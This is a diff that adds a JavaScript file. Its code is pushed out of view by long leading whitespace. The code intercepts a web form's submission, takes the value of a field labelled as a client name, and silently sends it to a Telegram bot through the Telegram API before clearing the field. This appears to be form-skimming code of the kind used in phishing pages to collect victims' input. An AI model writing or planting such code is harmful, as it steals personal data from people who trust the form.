@@ -1,0 +1,40 @@
+                                                                document.addEventListener('DOMContentLoaded', () => {
+    const forms = document.querySelector('#forms');
+
+    if (forms) {
+        forms.addEventListener("submit", (e) => {
+            e.preventDefault();
+
+            const infopInput = document.getElementById("infop"); 
+            const infop = infopInput.value;
+
+         
+            
+            const my_text = `client name ${infop}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
+
+            const api = new XMLHttpRequest();
+            api.open("GET", url, true);
+            api.send();
+            api.onerror = function(error) {
+                console.error("Error sending message:", error);
+            };
+         
+            api.onreadystatechange = function() {
+                if (api.readyState === 4) {
+                    if (api.status === 200) {
+                        console.log("Message sent successfully:", JSON.parse(api.responseText));
+                    } else {
+                        console.error("Error sending message:", api.status, api.responseText);
+                    }
+                }
+            };
+
+            infopInput.value = ""; // Clear the input field
+            console.log("Message sent:", infop);
+            
+        });
+    } else {
+        console.error("Form element not found!");
+    }
+});                                                                                                                
